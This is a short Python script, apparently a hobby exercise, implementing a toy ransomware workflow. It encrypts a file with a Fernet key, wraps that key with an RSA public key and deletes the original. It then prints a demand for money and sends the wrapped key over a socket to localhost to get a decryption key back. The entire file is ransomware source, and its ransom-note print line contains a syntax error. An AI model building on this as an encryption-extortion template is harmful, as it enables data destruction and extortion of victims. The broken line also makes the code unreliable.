import os
from cryptography import x509
from cryptography.fernet import Fernet
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.serialization import load_pem_public_key
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes

import socket

# step 1
with open('public_key.pem', 'rb') as f:
	pem_data = f.read()
public_key = load_pem_public_key(pem_data, backend=default_backend())
#print(public_key)
#print(type(public_key))
#print(isinstance(public_key, rsa.RSAPublicKey))
#print((public_key.public_numbers().e, public_key.public_numbers().n))

# step 2
random_key = Fernet.generate_key()
input_file = 'test.txt'
output_file = 'test.encrypted'

with open(input_file, 'rb') as f:
	data = f.read()
fernet = Fernet(random_key)
encrypted = fernet.encrypt(data)

with open(output_file, 'wb') as f:
	f.write(encrypted)

# can delete input file here or could have just overwritten the input file

# step 3
random_key_encrypted = public_key.encrypt(random_key, 
	padding.OAEP(
		mgf=padding.MGF1(algorithm=hashes.SHA256()),
		algorithm=hashes.SHA256(),
		label=None
	)
)

# step 5
del random_key
del fernet
if os.path.isfile('./test.txt'):
	os.remove('./test.txt')
else:
	print('Error: file not found')


# step 6
print('Your key is %s' random_key_encrypted)
print('Send this key and some money to me to get your data back')


# step 7 - auto send the key because why not?
s = socket.socket()
s.connect(('localhost', 12345))
s.sendall(random_key_encrypted) # how does this semd? all at once or in chunks

# step 8 - lulz

# step 9 
random_key = s.recv(2048)

# step 10 
with open(output_file, 'rb') as f:
	enc_data = f.read()
fernet = Fernet(random_key)
decrypted = fernet.decrypt(enc_data)

with open(input_file, 'wb') as f:
	f.write(decrypted)

s.close()
